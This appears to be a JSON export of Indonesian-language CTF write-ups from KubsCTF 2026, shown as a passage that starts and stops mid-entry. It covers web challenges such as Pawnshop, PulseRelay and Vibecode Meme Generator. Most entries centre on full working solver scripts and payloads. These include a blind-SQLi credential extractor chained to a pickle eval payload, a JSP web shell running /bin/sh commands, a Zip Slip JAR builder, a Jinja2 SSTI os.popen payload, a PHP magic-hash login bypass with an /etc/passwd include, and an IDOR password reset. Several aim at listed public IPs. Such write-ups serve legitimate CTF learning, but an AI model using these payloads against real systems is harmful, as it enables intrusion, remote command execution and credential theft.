        "content": "- Oracle menggunakan `count == 1` sebagai TRUE dan `count == 0` sebagai FALSE.\n- Ekstraksi dilakukan dengan binary search agar request tetap terarah.\n- Ledger berada di container `loan-service`, bukan filesystem container FastAPI; karena itu direct `/api/documents/read` bukan jalur yang benar.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport argparse\nimport os\nimport pickle\nimport re\nimport sys\n\nimport requests\n\n\nDEFAULT_TARGET = \"http://pawnshop.standalone.stf\"\nLEDGER_PATH = \"/root/shadow_records/off_books_ledger.dat\"\nFLAG_RE = re.compile(r\"(?:KubSTU|FLAG)\\{[^}]+\\}\")\n\n\ndef oracle(session, target, condition):\n    payload = f\"Viktor Petrov' AND ({condition}) AND '1'='1\"\n    if len(payload) > 200:\n        raise RuntimeError(f\"SQLi payload exceeds application limit: {len(payload)}\")\n\n    response = session.post(\n        f\"{target}/api/kyc/verify\",\n        json={\"name\": payload},\n        timeout=20,\n    )\n    if response.status_code != 200:\n        raise RuntimeError(\n            f\"KYC oracle failed: HTTP {response.status_code} {response.text[:200]}\"\n        )\n\n    try:\n        count = response.json()[\"count\"]\n    except (ValueError, KeyError) as exc:\n        raise RuntimeError(\"KYC oracle returned an unexpected response\") from exc\n\n    return count == 1\n\n\ndef extract_number(session, target, expression, maximum):\n    if not oracle(session, target, f\"({expression}) <= {maximum}\"):\n        raise RuntimeError(f\"Value exceeds extraction bound: {expression}\")\n\n    low, high = 0, maximum\n    while low < high:\n        middle = (low + high) // 2\n        if oracle(session, target, f\"({expression}) > {middle}\"):\n            low = middle + 1\n        else:\n            high = middle\n    return low\n\n\ndef extract_string(session, target, expression, maximum_length):\n    text_expression = f\"coalesce(({expression})::text,'')\"\n    length = extract_number(\n        session,\n        target,\n        f\"length({text_expression})\",\n        maximum_length,\n    )\n\n    result = []\n    for position in range(1, length + 1):\n        code = extract_number(\n            session,\n            target,\n            f\"ascii(substr({text_expression},{position},1))\",\n            127,\n        )\n        result.append(chr(code))\n    return \"\".join(result)\n\n\ndef read_document(session, target, headers, path):\n    response = session.get(\n        f\"{target}/api/documents/read\",\n        params={\"path\": path},\n        headers=headers,\n        timeout=20,\n    )\n    if response.status_code == 200:\n        try:\n            return response.json().get(\"content\", \"\")\n        except ValueError as exc:\n            raise RuntimeError(\"Document endpoint returned non-JSON data\") from exc\n    raise RuntimeError(\n        f\"Document read failed for {path}: HTTP {response.status_code} \"\n        f\"{response.text[:200]}\"\n    )\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Solve the Pawnshop CTF challenge\")\n    parser.add_argument(\n        \"target\",\n        nargs=\"?\",\n        default=os.environ.get(\"TARGET\", DEFAULT_TARGET),\n        help=\"challenge base URL (or use TARGET)\",\n    )\n    args = parser.parse_args()\n    target = args.target.rstrip(\"/\")\n    session = requests.Session()\n\n    print(\"[+] Checking blind SQLi oracle\")\n    if not oracle(session, target, \"1=1\") or oracle(session, target, \"1=2\"):\n        raise RuntimeError(\"boolean SQLi oracle is unstable\")\n\n    row = \"SELECT {column} FROM public.users ORDER BY id LIMIT 1\"\n    username = extract_string(session, target, row.format(column=\"username\"), 64)\n    password = extract_string(session, target, row.format(column=\"password\"), 128)\n    print(f\"[+] Extracted account: {username}\")\n\n    login = session.post(\n        f\"{target}/api/auth/login\",\n        json={\"username\": username, \"password\": password},\n        timeout=20,\n    )\n    if login.status_code != 200:\n        raise RuntimeError(f\"manager login failed: HTTP {login.status_code} {login.text[:200]}\")\n    try:\n        token = login.json()[\"token\"]\n    except (ValueError, KeyError) as exc:\n        raise RuntimeError(\"login response did not contain a token\") from exc\n\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n\n    config = read_document(session, target, headers, \"/app/secrets.cfg\")\n    api_key_match = re.search(r\"API Key:\\s*([0-9a-fA-F]{32})\", config)\n    if not api_key_match:\n        raise RuntimeError(\"API key was not found in /app/secrets.cfg\")\n\n    api_key = api_key_match.group(1)\n\n    class ReadLedger:\n        def __reduce__(self):\n            expression = (\n                \"{'alert_type': open(\" + repr(LEDGER_PATH) + \").read(), \"\n                \"'loan_id': 1, 'message': 'probe'}\"\n            )\n            return (eval, (expression,))\n\n    payload = pickle.dumps(ReadLedger(), protocol=4)\n    response = session.post(\n        f\"{target}/api/alerts/process\",\n        headers={\n            \"X-API-Key\": api_key,\n            \"Content-Type\": \"application/x-pickle\",\n        },\n        data=payload,\n        timeout=20,\n    )\n    if response.status_code != 200:\n        raise RuntimeError(\n            f\"alert service failed: HTTP {response.status_code} {response.text[:500]}\"\n        )\n\n    match = FLAG_RE.search(response.text)\n    if not match:\n        raise RuntimeError(\"ledger response did not contain a KubSTU/FLAG token\")\n\n    print(f\"[+] Read exact ledger pa"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{d33p_r4bb1t_h0l3_hunt3r}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-phantomfeatures",
    "title": "Phantom Features",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Flag tersedia melalui endpoint API yang tidak menerapkan autentikasi. Halaman utama juga membocorkan path endpoint admin dan token debug, tetapi token tersebut tidak diperlukan.",
    "problemDescription": "Target yang diuji:\n\nFile lokal tidak tersedia, jadi challenge ini diperlakukan sebagai blankbox. Solver ada di [solve.py](./solve.py).",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Flag tersedia melalui endpoint API yang tidak menerapkan autentikasi. Halaman utama juga membocorkan path endpoint admin dan token debug, tetapi token tersebut tidak diperlukan.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "Target yang diuji:\n\n\n\nFile lokal tidak tersedia, jadi challenge ini diperlakukan sebagai blankbox. Solver ada di [solve.py](./solve.py).",
        "code": "http://159.194.241.74:35802\nhttp://31.128.36.79:35802\nhttp://141.133.193.30:35802"
      },
      {
        "title": "Analisis Awal",
        "content": "`GET /` mengembalikan halaman Phantom Messenger dengan komentar HTML berikut:\n\n```html\n<!-- Security: flag is at /api/v1/admin/flag with token fromaiagent -->\n<!-- Debug: ADMIN_TOKEN=fromaiagent, endpoint: /api/debug/flag -->\n<!-- TODO: remove debug endpoint /api/flag before production -->\n```\n\nPetunjuk ini mengungkap endpoint admin, endpoint debug, dan token. Endpoint utama kemudian diuji langsung tanpa header autentikasi.",
        "code": ""
      },
      {
        "title": "Source Code Review",
        "content": "Tidak ada source code, Dockerfile, database dump, atau konfigurasi di direktori challenge. Analisis dilakukan melalui respons HTTP.",
        "code": ""
      },
      {
        "title": "Vulnerability",
        "content": "Broken access control / unauthenticated sensitive endpoint. Endpoint `/api/v1/admin/flag` mengembalikan flag kepada request anonim. Bukti responsnya:\n\n\n\nBody respons:\n\n```json\n{\n  \"flag\": \"KubSTU{c0ngr4ts_y0u_f0und_th3_d3bug_endp0int_n0w_l00k_d33p3r}\",\n  \"status\": \"success\",\n  \"verified\": \"true\"\n}\n```",
        "code": "HTTP/1.1 200 OK\nContent-Type: application/json\nX-Flag-Verified: true"
      },
      {
        "title": "Eksploitasi",
        "content": "Request minimal:\n\n\n\nTidak ada cookie, token, atau header khusus yang dibutuhkan. Flag diambil langsung dari field `flag` pada JSON response.",
        "code": "curl -i http://159.194.241.74:35802/api/v1/admin/flag"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Eksploitasi deterministik selama endpoint tetap tersedia: satu request anonim ke endpoint tersebut langsung menghasilkan JSON sukses dan header `X-Flag-Verified: true`.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport argparse\nimport json\nimport os\nimport re\nimport sys\nfrom urllib.error import HTTPError, URLError\nfrom urllib.request import Request, urlopen\n\n\nDEFAULT_TARGET = \"http://159.194.241.74:35802\"\nFLAG_RE = re.compile(r\"[A-Za-z0-9_]+\\{[^\\r\\n}]+\\}\")\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"Extract the Phantom Features flag\")\n    parser.add_argument(\n        \"target\",\n        nargs=\"?\",\n        default=os.environ.get(\"TARGET\", DEFAULT_TARGET),\n        help=\"challenge base URL (or set TARGET)\",\n    )\n    args = parser.parse_args()\n\n    target = args.target.rstrip(\"/\")\n    url = f\"{target}/api/v1/admin/flag\"\n    request = Request(url, headers={\"User-Agent\": \"phantom-features-solver/1.0\"})\n\n    try:\n        with urlopen(request, timeout=10) as response:\n            body = response.read().decode(\"utf-8\", errors=\"replace\")\n            status = response.status\n            verified = response.headers.get(\"X-Flag-Verified\", \"\")\n    except HTTPError as exc:\n        print(f\"[-] HTTP {exc.code} from {url}\", file=sys.stderr)\n        return 1\n    except URLError as exc:\n        print(f\"[-] Request failed for {url}: {exc.reason}\", file=sys.stderr)\n        return 1\n    except TimeoutError:\n        print(f\"[-] Request timed out: {url}\", file=sys.stderr)\n        return 1\n\n    print(f\"[+] GET {url} -> HTTP {status}\")\n    if verified:\n        print(f\"[+] X-Flag-Verified: {verified}\")\n\n    try:\n        data = json.loads(body)\n        candidate = data.get(\"flag\", \"\")\n    except json.JSONDecodeError:\n        candidate = \"\"\n\n    if not candidate:\n        match = FLAG_RE.search(body)\n        candidate = match.group(0) if match else \"\"\n\n    if not candidate:\n        print(\"[-] No flag found in the endpoint response\", file=sys.stderr)\n        return 1\n\n    print(f\"<FLAG>{candidate}</FLAG>\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{c0ngr4ts_y0u_f0und_th3_d3bug_endp0int_n0w_l00k_d33p3r}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-pulserelay",
    "title": "PulseRelay — KubSTU CTF Writeup",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "**Category:** Web  \n**Difficulty:** Hard  \n**Vulnerabilities:** Path Traversal, Authentication Bypass, Broken Access Control, Zip Slip, RCE",
    "problemDescription": "Aplikasinya berjalan di Java 11 dengan embedded Jetty 9.4 dan H2 Database. Dari halaman utama, ada komentar JavaScript yang menunjukkan beberapa route internal, termasuk setup wizard.\n\nOutput:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Aplikasinya berjalan di Java 11 dengan embedded Jetty 9.4 dan H2 Database. Dari halaman utama, ada komentar JavaScript yang menunjukkan beberapa route internal, termasuk setup wizard.\n\n\n\nOutput:\n\n\n\n`/setup/` menarik karena deskripsi challenge menyebutkan route ini dikecualikan dari authentication filter.\n\nSaat diakses, setup wizard memang sudah dinonaktifkan. Tapi pengecualian autentikasi untuk path tersebut ternyata masih berlaku.",
        "code": "curl -s https://TARGET/robots.txt"
      },
      {
        "title": "Authentication Bypass",
        "content": "Akses langsung ke admin console selalu diarahkan ke login.\n\n\n\nHasilnya `302 Found` dengan redirect menuju `/admin/login`.\n\nKemudian saya mencoba traversal melalui direktori setup menggunakan `--path-as-is` agar curl tidak menghapus `../` sebelum request dikirim.\n\n\n\nHasilnya `200 OK`, dan halaman dashboard admin berhasil ditampilkan tanpa autentikasi.\n\nPayload yang sama juga berlaku untuk route lainnya:\n\n\n\nMasalahnya ada pada urutan pemrosesan path. Authentication filter mengecek raw request URI yang diawali `/setup/`, sedangkan routing aplikasi menormalisasi `%2e%2e` menjadi `..` dan akhirnya mengakses `/admin/`.",
        "code": "curl -k -I https://TARGET/admin/dashboard"
      },
      {
        "title": "Privilege Escalation",
        "content": "Halaman `/admin/users` memiliki fitur pembuatan user baru yang menerima parameter `role`, termasuk `admin`.\n\nFrontend menggunakan endpoint:\n\n\n\nRequest membutuhkan CSRF token yang terdapat di form halaman user management.\n\nUntuk eksploitasi yang berhasil saya gunakan akun bawaan `user / password123`, lalu mengambil token dari halaman admin.\n\n\n\nDengan CSRF token yang sesuai session, endpoint pembuatan user ternyata bisa digunakan oleh akun ber-role `user`.\n\n\n\nResponse:\n\n```json\n{\n  \"success\": true,\n  \"message\": \"User created successfully\"\n}\nbash\ncurl -ks -c admin.cookies -b admin.cookies \\\n  -X POST \"$BASE/admin/login\" \\\n  --data-urlencode \"username=relayadmin\" \\\n  --data-urlencode \"password=RelayAdmin2026!\"\n```\n\nAkses ke halaman user management mengonfirmasi bahwa akun tersebut memiliki role `admin`.",
        "code": "POST /admin/users/create"
      },
      {
        "title": "Plugin Upload dan Zip Slip",
        "content": "Admin console memiliki Plugin Manager yang menerima file JAR dan otomatis mengekstrak isinya.\n\n\n\nAwalnya saya mencoba upload JAR sederhana dan mengakses resource hasil ekstraksinya melalui `/plugins/`.\n\nFile `test.txt` di dalam JAR ternyata bisa diakses langsung:\n\n\n\nServer mengembalikan isi file dengan status `200 OK`.\n\nDari sini saya menguji apakah extractor memvalidasi nama entry ZIP sebelum menulis file.\n\nPayload uji menggunakan entry:\n\n\n\nSetelah JAR di-upload, file tersebut ternyata muncul di direktori plugin lain:\n\n\n\nOutput:\n\n\n\nIni membuktikan **Zip Slip**. Extractor mengikuti `../` pada nama entry archive sehingga file bisa ditulis keluar dari direktori ekstraksi yang seharusnya.\n\nSaya juga sempat menguji JSP biasa, Java `Main-Class`, plugin descriptor, dan symbolic link ZIP. Tidak ada yang memberikan eksekusi. JSP yang disimpan langsung dalam direktori plugin hanya dikembalikan sebagai source code.",
        "code": "POST /admin/plugins/upload"
      },
      {
        "title": "Exploit: Zip Slip to JSP RCE",
        "content": "Petunjuk terakhir mengarah ke lokasi JSP yang harus ditulis dan cara Jetty menanganinya.\n\nTargetnya adalah membuat JAR berisi entry `../cmd.jsp`, lalu mengakses JSP melalui path `/plugins//cmd.jsp`.\n\nSaya membuat JSP sederhana yang mengambil parameter `cmd`, menjalankannya menggunakan `Runtime.getRuntime().exec()`, lalu menampilkan stdout.\n\n```jsp\n<%@ page import=\"java.io.*\" %>\n<%\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null) {\n    Process p = Runtime.getRuntime().exec(\n        new String[]{\"/bin/sh\", \"-c\", cmd}\n    );\n\n    BufferedReader r = new BufferedReader(\n        new InputStreamReader(p.getInputStream())\n    );\n\n    String line;\n    while ((line = r.readLine()) != null) {\n        out.println(line);\n    }\n\n    r.close();\n}\n%>\npython\nimport zipfile\n\nwith zipfile.ZipFile(\"pulse-exploit.jar\", \"w\") as z:\n    z.writestr(\n        \"META-INF/MANIFEST.MF\",\n        \"Manifest-Version: 1.0\\n\\n\"\n    )\n\n    z.write(\"cmd.jsp\", \"../cmd.jsp\")\n    z.writestr(\"marker.txt\", \"ZIPSLIP_JSP_TEST\")\nbash\nTOKEN=$(curl -ks -b admin.cookies \\\n  \"$BASE/admin/plugins\" |\n  grep -oP 'name=\"csrf_token\" value=\"\\K[^\"]+')\nbash\ncurl -ks -b admin.cookies \\\n  -X POST \"$BASE/admin/plugins/upload\" \\\n  -F \"csrf_token=$TOKEN\" \\\n  -F \"plugin_name=PulseExploit\" \\\n  -F \"plugin_version=1.0.0\" \\\n  -F \"plugin_file=@pulse-exploit.jar;type=application/java-archive\"\ntext\n/plugins//cmd.jsp\n```\n\nPerbedaan pentingnya ada pada double slash (`//`). JSP yang sebelumnya diakses melalui direktori plugin biasa hanya disajikan sebagai file statis, sedangkan path ini memungkinkan eksekusi JSP di Jetty.",
        "code": "\nSimpan sebagai `cmd.jsp`, kemudian masukkan ke JAR menggunakan Python.\n"
      },
      {
        "title": "Flag Extraction",
        "content": "Untuk menguji eksekusi command:\n\n\n\nSetelah JSP berhasil dieksekusi, file flag dibaca dari lokasi yang diberikan pada hint:\n\n\n\nFlag yang diperoleh:\n\n\n\n\n**Flag:**\n\n`KubSTU{pul53r3l4y_pl4t_rc3_62a90facf9f5d33e}`",
        "code": "curl -ks --path-as-is \\\n  \"$BASE/plugins//cmd.jsp?cmd=id\""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-shift-leftbrainright",
    "title": "Shift-Left, Brain-Right",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Bug ada di parameter `course` pada endpoint `/`. Input user dimasukkan ke source template sebelum diproses `render_template_string()`. Akibatnya, ekspresi Jinja2 dari user dieksekusi server-side dan dapat berkembang menjadi RCE.",
    "problemDescription": "- Target: `http://193.168.46.146:32489/`\n- Artefak lokal: `report.json`\n- Solver: `solve.py`\n\n`report.json` adalah hasil SAST Semgrep untuk `app.py`. Temuannya menyebut input mengalir ke HTML yang dibuat manual dan berisiko SSTI/XSS.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Bug ada di parameter `course` pada endpoint `/`. Input user dimasukkan ke source template sebelum diproses `render_template_string()`. Akibatnya, ekspresi Jinja2 dari user dieksekusi server-side dan dapat berkembang menjadi RCE.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "- Target: `http://193.168.46.146:32489/`\n- Artefak lokal: `report.json`\n- Solver: `solve.py`",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "`report.json` adalah hasil SAST Semgrep untuk `app.py`. Temuannya menyebut input mengalir ke HTML yang dibuat manual dan berisiko SSTI/XSS.\n\nForm pencarian pada halaman utama mengirim request `GET /?course=...`.",
        "code": ""
      },
      {
        "title": "Source Code Review",
        "content": "Source aplikasi yang dibaca melalui primitive SSTI menunjukkan alur berikut:\n\n\n\n`course_query` disisipkan ke source template sebelum kompilasi Jinja2. Jadi karakter `{{ ... }}` dari request menjadi ekspresi template yang valid.",
        "code": "@app.route('/')\ndef index():\n    course_query = request.args.get('course', 'Введение в DevSecOps')\n    template = PAGE.replace('__COURSE_QUERY__', course_query)\n    return render_template_string(template)"
      },
      {
        "title": "Vulnerability",
        "content": "Ini adalah server-side template injection pada Jinja2. Primitive akses global Python berikut menghasilkan output proses:\n\n```jinja2\n{{cycler.__init__.__globals__.os.popen('id').read()}}\n```\n\nResponse mengembalikan `uid=1000(ctfuser)`, sehingga primitive sudah terbukti menjadi command execution, bukan hanya refleksi HTML.",
        "code": ""
      },
      {
        "title": "Eksploitasi",
        "content": "Flag disimpan pada environment variable `GZCTF_FLAG`. Payload final membaca variable tersebut:\n\n```jinja2\n{{cycler.__init__.__globals__.os.popen('printenv GZCTF_FLAG').read()}}\ntext\nGET /?course={{cycler.__init__.__globals__.os.popen('printenv%20GZCTF_FLAG').read()}}\n```\n\nSaat dikirim memakai URL encoding, nilai `result-value` pada response berisi flag asli.",
        "code": "\nRequest penting:\n"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit bergantung pada endpoint `/`, parameter `course`, Jinja2 global `cycler`, dan environment variable `GZCTF_FLAG`. Solver tidak melakukan enumerasi atau request ke host lain. Selama pengujian, payload berhasil beberapa kali; validasi ulang terakhir mendapat `Connection refused` karena service target sudah tidak listen.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport html\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nDEFAULT_TARGET = \"http://193.168.46.146:32489\"\nTARGET = os.environ.get(\"TARGET\", DEFAULT_TARGET).rstrip(\"/\")\nFLAG_RE = re.compile(r\"[A-Za-z0-9_]+\\{[^{}\\r\\n]+\\}\")\n\n\ndef main() -> int:\n    target = sys.argv[1].rstrip(\"/\") if len(sys.argv) > 1 else TARGET\n    payload = \"{{cycler.__init__.__globals__.os.popen('printenv GZCTF_FLAG').read()}}\"\n\n    try:\n        response = requests.get(\n            target,\n            params={\"course\": payload},\n            timeout=10,\n        )\n        response.raise_for_status()\n    except requests.RequestException as exc:\n        print(f\"[!] request gagal: {exc}\", file=sys.stderr)\n        return 1\n\n    match = re.search(\n        r'<div class=\"result-value\">(.*?)</div>',\n        response.text,\n        flags=re.DOTALL,\n    )\n    if not match:\n        print(\"[!] elemen result-value tidak ditemukan\", file=sys.stderr)\n        return 1\n\n    result = html.unescape(match.group(1)).strip()\n    flag = FLAG_RE.search(result)\n    if not flag:\n        print(\"[!] flag tidak ditemukan pada hasil SSTI\", file=sys.stderr)\n        return 1\n\n    print(f\"<FLAG>{flag.group(0)}</FLAG>\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{S46t_1s_C00l_64dfd25ce7ee}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-vibecodememegenerator",
    "title": "Vibecode Meme Generator",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Ada dua bug yang dipakai berurutan: login admin memakai perbandingan hash PHP yang longgar, lalu renderer template menerima legacy include yang bisa membuka file absolut.",
    "problemDescription": "Target yang diuji:\n\n- `http://212.67.10.66:5000`\n- `http://93.188.185.171:5000`\n- `http://159.194.241.235:5000`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Ada dua bug yang dipakai berurutan: login admin memakai perbandingan hash PHP yang longgar, lalu renderer template menerima legacy include yang bisa membuka file absolut.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "Target yang diuji:\n\n- `http://212.67.10.66:5000`\n- `http://93.188.185.171:5000`\n- `http://159.194.241.235:5000`\n\nDirektori challenge lokal kosong, jadi analisis dilakukan terhadap service remote yang diberikan. Script reproduksi ada di [solve.py](./solve.py).",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "Homepage menampilkan form `POST /login.php`. Setelah berhasil login, `/studio` menampilkan form renderer:\n\n\n\nHint login menyebut verifier lama membandingkan hasil, bukan tipe. Nilai `admin` dengan password `240610708` menghasilkan redirect ke `/studio`, sedangkan kredensial biasa gagal.",
        "code": "POST /render.php\ncaption=...\ntemplate=classic"
      },
      {
        "title": "Source Code Review",
        "content": "Tidak ada source code atau Dockerfile di direktori challenge. Behavior response dipakai sebagai bukti:\n\n- `admin:240610708` mendapat `302 Location: /studio`.\n- Template normal `classic` menghasilkan meme.\n- Template berbentuk `[[include:...]]` masuk ke branch renderer khusus dan mengembalikan error file ketika target tidak bisa dibuka.",
        "code": ""
      },
      {
        "title": "Vulnerability",
        "content": "Password `240610708` adalah magic MD5 hash:\n\n\n\nPrefix `0e` membuat hash diperlakukan sebagai angka nol oleh perbandingan PHP `==`, sehingga verifier menerima hasil tersebut terhadap hash admin yang juga berada pada bentuk numeric-string.\n\nRenderer juga menerima sintaks legacy:\n\n\n\nTarget langsung dipakai untuk membuka file. Filter permukaan memblokir bentuk literal, tetapi form parser aplikasi tetap mendecode persen-encoding. Karena itu semua karakter pada nilai template dikirim sebagai percent-encoding.",
        "code": "md5(240610708) = 0e462097431906509019562988736854"
      },
      {
        "title": "Eksploitasi",
        "content": "Request render yang berhasil:\n\n```http\nPOST /render.php\nContent-Type: application/x-www-form-urlencoded\n\ncaption=probe&template=%5B%5B%69%6e%63%6c%75%64%65%3a%2f%65%74%63%2f%70%61%73%73%77%64%5d%5d\n```\n\nSetelah decoding form, nilai template menjadi `[[include:/etc/passwd]]`. Response `200 OK` menampilkan isi `/etc/passwd` di dalam `<pre>` dan flag di elemen `<p class='flag'>`.",
        "code": ""
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit stabil pada target yang diuji. Login harus dilakukan lebih dulu agar cookie `capybara_session` tersedia. Payload template harus dikirim sebagai body form mentah yang sudah dipersenkan; jika dikirim sebagai dictionary biasa, library HTTP dapat meng-encode ulang karakter `%` dan payload tidak lagi sama.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport argparse\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nFLAG_RE = re.compile(r\"[A-Za-z0-9_]+\\{[^}\\r\\n]+\\}\")\n\n\ndef fully_encode(value: str) -> str:\n    \"\"\"Encode every byte while keeping the form parser able to decode it.\"\"\"\n    return \"\".join(f\"%{byte:02X}\" for byte in value.encode())\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"Solve Vibecode Meme Generator\")\n    parser.add_argument(\n        \"target\",\n        nargs=\"?\",\n        default=os.environ.get(\"TARGET\", \"http://212.67.10.66:5000\"),\n        help=\"challenge base URL (or set TARGET)\",\n    )\n    args = parser.parse_args()\n    target = args.target.rstrip(\"/\")\n\n    session = requests.Session()\n    session.headers[\"User-Agent\"] = \"vibecode-meme-solver/1.0\"\n\n    login = session.post(\n        f\"{target}/login.php\",\n        data={\"username\": \"admin\", \"password\": \"240610708\"},\n        allow_redirects=False,\n        timeout=8,\n    )\n    if login.status_code != 302 or login.headers.get(\"Location\") != \"/studio\":\n        raise RuntimeError(\n            f\"login bypass failed: HTTP {login.status_code}, \"\n            f\"Location={login.headers.get('Location')!r}\"\n        )\n    print(\"[+] authenticated as admin\")\n\n    # The application decodes form encoding before applying the legacy include\n    # renderer. Fully encoding the value avoids the front-end path filter.\n    template = \"[[include:/etc/passwd]]\"\n    body = \"caption=probe&template=\" + fully_encode(template)\n    rendered = session.post(\n        f\"{target}/render.php\",\n        data=body,\n        headers={\"Content-Type\": \"application/x-www-form-urlencoded\"},\n        timeout=8,\n    )\n    if rendered.status_code != 200:\n        raise RuntimeError(f\"renderer failed: HTTP {rendered.status_code}: {rendered.text[:120]}\")\n\n    flag_match = FLAG_RE.search(rendered.text)\n    if not flag_match:\n        raise RuntimeError(\"renderer response did not contain a flag\")\n\n    print(f\"[+] renderer returned /etc/passwd ({len(rendered.text)} bytes)\")\n    print(f\"<FLAG>{flag_match.group(0)}</FLAG>\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    try:\n        raise SystemExit(main())\n    except requests.RequestException as exc:\n        print(f\"request failed: {exc}\", file=sys.stderr)\n        raise SystemExit(1)\n    except RuntimeError as exc:\n        print(str(exc), file=sys.stderr)\n        raise SystemExit(1)\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{capybara_types_and_templates}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-bank1",
    "title": "Bank 1",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Bug ada di endpoint `/api/admin/reset_password`. Endpoint ini membutuhkan login dan CSRF, tetapi tidak memeriksa apakah user yang sedang login benar-benar admin. ID user juga bisa dipilih langsung oleh client. Dengan akun biasa, password user target `mgalankov@4274` bisa diganti.",
    "problemDescription": "Setelah login sebagai target, token pembelian satu kali dari `@kubstubank1_bot` dipakai pada transaksi flag yang sudah ada. Bot lalu mengirim flag.\n\n- Target: `https://bank.kubstu-ctf.ru/`\n- Kategori: Web\n- File lokal: tidak ada; challenge berupa blankbox remote.\n- Endpoint penting: `/api/openapi.json`, `/api/admin/reset_password`, `/api/verify_flag_token`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Bug ada di endpoint `/api/admin/reset_password`. Endpoint ini membutuhkan login dan CSRF, tetapi tidak memeriksa apakah user yang sedang login benar-benar admin. ID user juga bisa dipilih langsung oleh client. Dengan akun biasa, password user target `mgalankov@4274` bisa diganti.\n\nSetelah login sebagai target, token pembelian satu kali dari `@kubstubank1_bot` dipakai pada transaksi flag yang sudah ada. Bot lalu mengirim flag.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "- Target: `https://bank.kubstu-ctf.ru/`\n- Kategori: Web\n- File lokal: tidak ada; challenge berupa blankbox remote.\n- Endpoint penting: `/api/openapi.json`, `/api/admin/reset_password`, `/api/verify_flag_token`.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "`/api/docs/` mengungkap OpenAPI. Dokumentasi menyatakan `/api/admin/reset_password` adalah endpoint admin, tetapi security scheme yang terlihat hanya JWT dan CSRF.\n\nRequest ALTCHA bisa diselesaikan lokal dengan mencari `number` yang memenuhi:\n\n\n\nDengan akun biasa yang dibuat/tersedia untuk challenge, request reset password ke user ID 4 menghasilkan response sukses dan membocorkan username target:\n\n```json\n{\n  \"success\": true,\n  \"message\": \"Пароль пользователя mgalankov@4274 изменён\"\n}\n```",
        "code": "SHA256(salt + str(number)) == challenge"
      },
      {
        "title": "Source Code Review",
        "content": "Tidak ada source code atau Dockerfile lokal. Review dilakukan melalui OpenAPI, HTML form, JavaScript frontend, dan behavior response aplikasi.",
        "code": ""
      },
      {
        "title": "Vulnerability",
        "content": "`/api/admin/reset_password` mengalami broken access control/IDOR: autentikasi user biasa dianggap cukup untuk operasi yang seharusnya hanya dapat dilakukan admin. `target_user_id` diterima dari request tanpa authorization check terhadap role caller.\n\nEnumerasi ID juga memungkinkan karena perbedaan response antara user yang ada dan user yang tidak ada. ID 4 adalah `mgalankov@4274`.",
        "code": ""
      },
      {
        "title": "Eksploitasi",
